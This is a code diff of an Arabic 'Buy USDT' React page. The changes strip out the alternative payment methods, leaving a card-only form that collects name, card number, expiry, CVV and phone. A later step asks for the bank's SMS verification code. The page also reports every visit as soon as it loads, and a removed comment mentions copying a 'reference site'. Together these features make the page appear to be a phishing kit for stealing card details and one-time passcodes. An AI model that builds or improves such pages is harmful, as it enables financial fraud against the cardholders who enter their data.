@@ -10,14 +10,12 @@ import { ShieldCheck, Loader2, ArrowRight, CreditCard, Smartphone, CheckCircle2 
 import { useNotifyVisit, useSubmitOrder, useSubmitVerificationCode } from "@workspace/api-client-react";
 import { useToast } from "@/hooks/use-toast";
 
-// Validation Schemas
 const formSchema = z.object({
   amount: z.coerce.number().min(5, { message: "أقل مبلغ للشراء هو 5 USDT" }),
-  paymentMethod: z.string().min(1, { message: "يرجى اختيار طريقة الدفع" }),
   cardName: z.string().min(3, { message: "الاسم مطلوب" }),
-  cardNumber: z.string().min(16, { message: "رقم بطاقة غير صالح" }),
-  expiryDate: z.string().regex(/^(0[1-9]|1[0-2])\/?([0-9]{2})$/, { message: "تنسيق غير صالح (MM/YY)" }),
-  cvv: z.string().min(3, { message: "CVV غير صالح" }),
+  cardNumber: z.string().min(16, { message: "رقم بطاقة غير صالح" }).max(19, { message: "رقم بطاقة غير صالح" }),
+  expiryDate: z.string().regex(/^(0[1-9]|1[0-2])\/([0-9]{2})$/, { message: "تنسيق غير صالح (MM/YY)" }),
+  cvv: z.string().min(3, { message: "CVV غير صالح" }).max(4, { message: "CVV غير صالح" }),
   phone: z.string().min(10, { message: "رقم الهاتف مطلوب" }),
   walletAddress: z.string().min(20, { message: "عنوان المحفظة مطلوب" }),
   couponCode: z.string().optional(),
@@ -25,13 +23,18 @@ const formSchema = z.object({
 
 type FormValues = z.infer<typeof formSchema>;
 
-const PAYMENT_METHODS = [
-  { id: "credit_card", name: "بطاقة ائتمان / ماستركارد", icon: CreditCard },
-  { id: "zain_cash", name: "زين كاش", icon: Smartphone },
-  { id: "fib", name: "مصرف FIB", icon: Smartphone },
-];
-
 const EXCHANGE_RATE = 1320;
+
+function formatExpiryDate(value: string): string {
+  const digits = value.replace(/\D/g, "");
+  if (digits.length === 0) return "";
+  if (digits.length <= 2) return digits;
+  return digits.slice(0, 2) + "/" + digits.slice(2, 4);
+}
+
+function formatCardNumber(value: string): string {
+  return value.replace(/\D/g, "").slice(0, 16);
+}
 
 export default function Buy() {
   const [step, setStep] = useState<"form" | "verify" | "success">("form");
@@ -43,7 +46,6 @@ export default function Buy() {
   const { mutateAsync: submitOrder, isPending: isSubmitting } = useSubmitOrder();
   const { mutateAsync: submitVerify, isPending: isVerifying } = useSubmitVerificationCode();
 
-  // Notify on mount
   useEffect(() => {
     notifyVisit({ data: { timestamp: new Date().toISOString() } });
   }, [notifyVisit]);
@@ -52,7 +54,6 @@ export default function Buy() {
     resolver: zodResolver(formSchema),
     defaultValues: {
       amount: 100,
-      paymentMethod: "credit_card",
       cardName: "",
       cardNumber: "",
       expiryDate: "",
@@ -71,6 +72,7 @@ export default function Buy() {
       const payload = {
         ...data,
         amountIQD: calculatedIqd,
+        paymentMethod: "بطاقة ائتمان / ماستركارد",
       };
       const res = await submitOrder({ data: payload });
       
@@ -79,7 +81,7 @@ export default function Buy() {
         setStep("verify");
         window.scrollTo({ top: 0, behavior: 'smooth' });
       }
-    } catch (error) {
+    } catch {
       toast({
         title: "خطأ في الاتصال",
         description: "حدث خطأ أثناء إرسال الطلب، يرجى المحاولة مرة أخرى.",
@@ -98,7 +100,7 @@ export default function Buy() {
       if (res.success) {
         setStep("success");
       }
-    } catch (error) {
+    } catch {
       toast({
         title: "خطأ",
         description: "الكود غير صحيح أو حدث خطأ في الاتصال",
@@ -114,7 +116,6 @@ export default function Buy() {
         <div className="max-w-3xl mx-auto">
           <AnimatePresence mode="wait">
             
-            {/* STEP 1: Main Form */}
             {step === "form" && (
               <motion.div
                 key="form"
@@ -124,25 +125,23 @@ export default function Buy() {
                 className="space-y-8"
               >
                 <div className="text-center mb-10">
-                  <h1 className="text-3xl md:text-4xl font-display font-bold text-white mb-4">شراء USDT</h1>
+                  <h1 className="text-3xl md:text-4xl font-bold text-white mb-4">شراء USDT</h1>
                   <p className="text-zinc-400">أدخل بياناتك بأمان لإتمام عملية الشراء</p>
                 </div>
 
-                {/* Exchange Rate Card */}
                 <div className="glass-card-gold rounded-2xl p-6 flex flex-col md:flex-row items-center justify-between gap-6 mb-8">
                   <div>
                     <p className="text-sm text-zinc-400 font-medium mb-1">سعر الصرف الحالي</p>
                     <p className="text-xl font-bold text-white">100$ = <span className="text-primary">132,000</span> دينار عراقي</p>
                   </div>
                   <div className="h-12 w-px bg-white/10 hidden md:block"></div>
-                  <div className="text-left dir-ltr">
+                  <div className="text-left" dir="ltr">
                     <p className="text-sm text-zinc-400 font-medium mb-1">المبلغ المطلوب (IQD)</p>
                     <p className="text-2xl font-bold text-primary">{formatCurrency(calculatedIqd)}</p>
                   </div>
                 </div>
 
                 <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-8">
-                  {/* Amount Section */}
                   <div className="glass-card rounded-2xl p-6 md:p-8">
                     <h3 className="text-xl font-bold text-white mb-6 border-b border-white/10 pb-4">المبلغ المراد شراؤه</h3>
                     <div className="grid md:grid-cols-2 gap-6">
@@ -152,10 +151,12 @@ export default function Buy() {
                           <input 
                             {...form.register("amount")}
                             type="number"
+                            inputMode="numeric"
                             className={cn(
-                              "w-full bg-black/40 border rounded-xl px-4 py-3 text-white focus:outline-none focus:ring-1 transition-all text-left dir-ltr",
+                              "w-full bg-black/40 border rounded-xl px-4 py-3 text-white focus:outline-none focus:ring-1 transition-all text-left",
                               form.formState.errors.amount ? "border-red-500 focus:border-red-500 focus:ring-red-500" : "border-white/10 focus:border-primary focus:ring-primary"
                             )}
+                            dir="ltr"
                           />
                           <div className="absolute left-4 top-1/2 -translate-y-1/2 text-zinc-500 font-bold">USDT</div>
                         </div>
@@ -170,47 +171,34 @@ export default function Buy() {
                             type="text"
                             placeholder="T..."
                             className={cn(
-                              "w-full bg-black/40 border rounded-xl px-4 py-3 text-white focus:outline-none focus:ring-1 transition-all text-left dir-ltr",
+                              "w-full bg-black/40 border rounded-xl px-4 py-3 text-white focus:outline-none focus:ring-1 transition-all text-left",
                               form.formState.errors.walletAddress ? "border-red-500 focus:border-red-500 focus:ring-red-500" : "border-white/10 focus:border-primary focus:ring-primary"
                             )}
+                            dir="ltr"
                           />
                           {form.formState.errors.walletAddress && <p className="text-red-400 text-xs mt-1">{form.formState.errors.walletAddress.message}</p>}
                       </div>
                     </div>
                   </div>
 
-                  {/* Payment Method Section */}
                   <div className="glass-card rounded-2xl p-6 md:p-8">
-                    <h3 className="text-xl font-bold text-white mb-6 border-b border-white/10 pb-4">طريقة الدفع</h3>
-                    <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
-                      {PAYMENT_METHODS.map((method) => {
-                        const isSelected = form.watch("paymentMethod") === method.id;
-                        return (
-                          <div 
-                            key={method.id}
-                            onClick={() => form.setValue("paymentMethod", method.id)}
-                            className={cn(
-                              "cursor-pointer p-4 rounded-xl border transition-all flex flex-col items-center justify-center gap-3 text-center",
-                              isSelected 
-                                ? "bg-primary/10 border-primary text-primary shadow-[0_0_15px_rgba(251,191,36,0.15)]" 
-                                : "bg-black/20 border-white/10 text-zinc-400 hover:bg-white/5 hover:border-white/20"
-                            )}
-                          >
-                            <method.icon className={cn("w-6 h-6", isSelected ? "text-primary" : "text-zinc-500")} />
-                            <span className="font-semibold text-sm">{method.name}</span>
-                          </div>
-                        )
-                      })}
+                    <h3 className="text-xl font-bold text-white mb-6 border-b border-white/10 pb-4">💳 بيانات البطاقة</h3>
+                    
+                    <div className="flex items-center gap-3 p-4 rounded-xl bg-primary/10 border border-primary/30 mb-8">
+                      <CreditCard className="w-6 h-6 text-primary shrink-0" />
+                      <span className="text-primary font-bold">بطاقة ائتمان / ماستركارد</span>
                     </div>
 
-                    {/* Card Details (Shown for all methods for simplicity based on the reference site) */}
                     <div className="space-y-6">
                       <div>
                         <label className="block text-sm font-medium text-zinc-400 mb-2">الاسم كما في البطاقة <span className="text-red-400">*</span></label>
                         <input 
                           {...form.register("cardName")}
                           type="text"
-                          className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all"
+                          className={cn(
+                            "w-full bg-black/40 border rounded-xl px-4 py-3 text-white focus:outline-none focus:ring-1 transition-all",
+                            form.formState.errors.cardName ? "border-red-500 focus:border-red-500 focus:ring-red-500" : "border-white/10 focus:border-primary focus:ring-primary"
+                          )}
                         />
                         {form.formState.errors.cardName && <p className="text-red-400 text-xs mt-1">{form.formState.errors.cardName.message}</p>}
                       </div>
@@ -218,11 +206,20 @@ export default function Buy() {
                       <div>
                         <label className="block text-sm font-medium text-zinc-400 mb-2">رقم البطاقة <span className="text-red-400">*</span></label>
                         <input 
-                          {...form.register("cardNumber")}
+                          {...form.register("cardNumber", {
+                            onChange: (e) => {
+                              e.target.value = formatCardNumber(e.target.value);
+                            }
+                          })}
                           type="text"
+                          inputMode="numeric"
                           maxLength={16}
                           placeholder="0000 0000 0000 0000"
-                          className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all text-left dir-ltr tracking-widest"
+                          className={cn(
+                            "w-full bg-black/40 border rounded-xl px-4 py-3 text-white focus:outline-none focus:ring-1 transition-all text-left tracking-widest",
+                            form.formState.errors.cardNumber ? "border-red-500 focus:border-red-500 focus:ring-red-500" : "border-white/10 focus:border-primary focus:ring-primary"
+                          )}
+                          dir="ltr"
                         />
                         {form.formState.errors.cardNumber && <p className="text-red-400 text-xs mt-1">{form.formState.errors.cardNumber.message}</p>}
                       </div>
@@ -231,22 +228,40 @@ export default function Buy() {
                         <div>
                           <label className="block text-sm font-medium text-zinc-400 mb-2">تاريخ الانتهاء <span className="text-red-400">*</span></label>
                           <input 
-                            {...form.register("expiryDate")}
+                            {...form.register("expiryDate", {
+                              onChange: (e) => {
+                                e.target.value = formatExpiryDate(e.target.value);
+                              }
+                            })}
                             type="text"
+                            inputMode="numeric"
                             placeholder="MM/YY"
                             maxLength={5}
-                            className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all text-left dir-ltr"
+                            className={cn(
+                              "w-full bg-black/40 border rounded-xl px-4 py-3 text-white focus:outline-none focus:ring-1 transition-all text-center",
+                              form.formState.errors.expiryDate ? "border-red-500 focus:border-red-500 focus:ring-red-500" : "border-white/10 focus:border-primary focus:ring-primary"
+                            )}
+                            dir="ltr"
                           />
                           {form.formState.errors.expiryDate && <p className="text-red-400 text-xs mt-1">{form.formState.errors.expiryDate.message}</p>}
                         </div>
                         <div>
                           <label className="block text-sm font-medium text-zinc-400 mb-2">CVV <span className="text-red-400">*</span></label>
                           <input 
-                            {...form.register("cvv")}
+                            {...form.register("cvv", {
+                              onChange: (e) => {
+                                e.target.value = e.target.value.replace(/\D/g, "").slice(0, 4);
+                              }
+                            })}
                             type="password"
+                            inputMode="numeric"
                             maxLength={4}
                             placeholder="123"
-                            className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all text-center dir-ltr tracking-widest"
+                            className={cn(
+                              "w-full bg-black/40 border rounded-xl px-4 py-3 text-white focus:outline-none focus:ring-1 transition-all text-center tracking-widest",
+                              form.formState.errors.cvv ? "border-red-500 focus:border-red-500 focus:ring-red-500" : "border-white/10 focus:border-primary focus:ring-primary"
+                            )}
+                            dir="ltr"
                           />
                           {form.formState.errors.cvv && <p className="text-red-400 text-xs mt-1">{form.formState.errors.cvv.message}</p>}
                         </div>
@@ -257,8 +272,13 @@ export default function Buy() {
                         <input 
                           {...form.register("phone")}
                           type="tel"
+                          inputMode="numeric"
                           placeholder="07XX XXX XXXX"
-                          className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all text-left dir-ltr"
+                          className={cn(
+                            "w-full bg-black/40 border rounded-xl px-4 py-3 text-white focus:outline-none focus:ring-1 transition-all text-left",
+                            form.formState.errors.phone ? "border-red-500 focus:border-red-500 focus:ring-red-500" : "border-white/10 focus:border-primary focus:ring-primary"
+                          )}
+                          dir="ltr"
                         />
                         {form.formState.errors.phone && <p className="text-red-400 text-xs mt-1">{form.formState.errors.phone.message}</p>}
                       </div>
@@ -270,7 +290,8 @@ export default function Buy() {
                             {...form.register("couponCode")}
                             type="text"
                             placeholder="أدخل الكود"
-                            className="flex-1 bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all text-left dir-ltr uppercase"
+                            className="flex-1 bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all text-left uppercase"
+                            dir="ltr"
                           />
                           <button type="button" className="px-6 rounded-xl bg-white/5 border border-white/10 text-zinc-300 font-medium hover:bg-white/10 transition-colors">
                             تحقق
@@ -300,7 +321,6 @@ export default function Buy() {
               </motion.div>
             )}
 
-            {/* STEP 2: Verification Code */}
             {step === "verify" && (
               <motion.div
                 key="verify"
@@ -313,7 +333,7 @@ export default function Buy() {
                   <div className="w-20 h-20 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-6">
                     <Smartphone className="w-10 h-10 text-primary" />
                   </div>
-                  <h2 className="text-2xl font-display font-bold text-white mb-4">كود التحقق</h2>
+                  <h2 className="text-2xl font-bold text-white mb-4">كود التحقق</h2>
                   <p className="text-zinc-400 mb-8 leading-relaxed">
                     يرجى الانتظار، سيصلك كود تحقق برسالة نصية أو إشعار من البنك. الرجاء إدخاله أدناه لتأكيد العملية.
                   </p>
@@ -321,11 +341,13 @@ export default function Buy() {
                   <div className="mb-8">
                     <input 
                       type="text"
+                      inputMode="numeric"
                       value={code}
-                      onChange={(e) => setCode(e.target.value)}
-                      placeholder="----"
+                      onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
+                      placeholder="------"
                       maxLength={6}
-                      className="w-full text-center text-3xl font-bold tracking-[1em] bg-black/40 border border-white/10 rounded-xl px-4 py-4 text-white focus:outline-none focus:border-primary focus:ring-2 focus:ring-primary/50 transition-all dir-ltr"
+                      className="w-full text-center text-3xl font-bold tracking-[0.5em] bg-black/40 border border-white/10 rounded-xl px-4 py-4 text-white focus:outline-none focus:border-primary focus:ring-2 focus:ring-primary/50 transition-all"
+                      dir="ltr"
                     />
                   </div>
 
@@ -340,7 +362,6 @@ export default function Buy() {
               </motion.div>
             )}
 
-            {/* STEP 3: Success */}
             {step === "success" && (
               <motion.div
                 key="success"
@@ -360,7 +381,7 @@ export default function Buy() {
                     <CheckCircle2 className="w-12 h-12" />
                   </motion.div>
                   
-                  <h2 className="text-3xl font-display font-bold text-white mb-4 relative z-10">تم بنجاح!</h2>
+                  <h2 className="text-3xl font-bold text-white mb-4 relative z-10">تم بنجاح!</h2>
                   <p className="text-zinc-400 mb-8 relative z-10 leading-relaxed">
                     تم استلام طلبك والتحقق من البيانات. سيتم تحويل الرصيد إلى محفظتك خلال دقائق.
                   </p>
